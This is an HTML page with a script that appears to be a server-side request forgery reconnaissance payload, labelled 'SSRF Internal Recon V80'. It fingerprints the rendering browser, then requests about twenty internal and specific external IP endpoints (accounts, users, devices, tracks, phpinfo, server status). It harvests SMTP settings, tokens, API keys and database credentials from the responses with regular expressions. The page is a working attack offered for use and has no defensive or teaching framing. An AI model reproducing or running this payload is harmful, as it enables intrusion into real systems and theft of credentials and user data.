<!DOCTYPE html><html><head><meta charset="utf-8"><title>R</title></head><body>
<pre id="o">Init</pre>
<script>
var O=document.getElementById('o');O.textContent='';
function L(m){O.textContent+=m+'\n'}

L('=== SSRF Internal Recon V80 ===');
L('Time: '+new Date().toISOString());
L('UA: '+navigator.userAgent);

if(navigator.userAgentData){
    navigator.userAgentData.getHighEntropyValues(['fullVersionList','platform','platformVersion','architecture','bitness']).then(function(d){
        L('Version: '+JSON.stringify(d.fullVersionList));
        L('Platform: '+d.platform+' '+d.platformVersion+' '+d.architecture+'/'+d.bitness);
    });
}

L('');
L('Fetching internal endpoints with credentials...');

var targets = [
    {url:'https://127.0.0.1/backend/ax/init.php?node=3', name:'localhost init.php'},
    {url:'https://127.0.0.1/ax/veh/list.php?node=3', name:'localhost veh/list'},
    {url:'https://127.0.0.1/ax/accounts.php?node=3', name:'localhost accounts'},
    {url:'https://127.0.0.1/ax/users.php?node=3', name:'localhost users'},
    {url:'https://127.0.0.1/ax/devices.php?node=3', name:'localhost devices'},
    {url:'https://127.0.0.1/ax/groups.php?node=3', name:'localhost groups'},
    {url:'https://127.0.0.1/ax/tracks.php?node=3', name:'localhost tracks'},
    {url:'https://127.0.0.1/server-status', name:'Apache status'},
    {url:'https://127.0.0.1/nginx_status', name:'Nginx status'},
    {url:'https://127.0.0.1/phpinfo.php', name:'phpinfo'},
    {url:'https://127.0.0.1/info.php', name:'info.php'},
    {url:'https://127.0.0.1/backend/ax/init.php', name:'init.php no node'},
    {url:'https://41.71.64.235/backend/ax/init.php?node=3', name:'admin init.php'},
    {url:'https://41.71.64.235/ax/veh/list.php?node=3', name:'admin veh/list'},
    {url:'https://41.71.64.235/ax/accounts.php?node=3', name:'admin accounts'},
    {url:'https://41.71.64.235/ax/users.php?node=3', name:'admin users'},
    {url:'https://41.71.64.233/backend/ax/init.php?node=3', name:'.233 init.php'},
    {url:'https://41.71.64.234/backend/ax/init.php?node=3', name:'.234 init.php'},
    {url:'https://41.71.64.237/backend/ax/init.php?node=3', name:'.237 init.php'},
    {url:'https://41.71.64.238/backend/ax/init.php?node=3', name:'.238 init.php'},
];

var done=0;
for(var i=0;i<targets.length;i++){
    (function(t,idx){
        var x=new XMLHttpRequest();
        x.open('GET',t.url,true);
        x.timeout=8000;
        x.onload=function(){
            var body=x.responseText;
            L('['+idx+'] '+t.name+' HTTP '+x.status+' ('+body.length+' chars)');
            if(body.length>0 && body.length<5000){
                L('  BODY: '+body.substring(0,2000));
            } else if(body.length>=5000){
                L('  BODY[0:2000]: '+body.substring(0,2000));
                // Extract secrets
                var smtpM=body.match(/"smtp":\{[^}]+\}/);
                if(smtpM) L('  SMTP: '+smtpM[0]);
                var tokenM=body.match(/"token":"[^"]+"/);
                if(tokenM) L('  TOKEN: '+tokenM[0]);
                var apiM=body.match(/"apiKey":"[^"]+"/);
                if(apiM) L('  APIKEY: '+apiM[0]);
                var dbM=body.match(/(db_host|db_pass|database|dsn|connection)[^"]*"[^"]*"/i);
                if(dbM) L('  DB: '+dbM[0]);
            }
            done++;
            if(done>=targets.length) L('\nDone: '+done+'/'+targets.length);
        };
        x.onerror=function(){
            L('['+idx+'] '+t.name+' NETWORK ERROR');
            done++;
            if(done>=targets.length) L('\nDone: '+done+'/'+targets.length);
        };
        x.ontimeout=function(){
            L('['+idx+'] '+t.name+' TIMEOUT');
            done++;
            if(done>=targets.length) L('\nDone: '+done+'/'+targets.length);
        };
        x.send();
    })(targets[i],i);
}
</script>
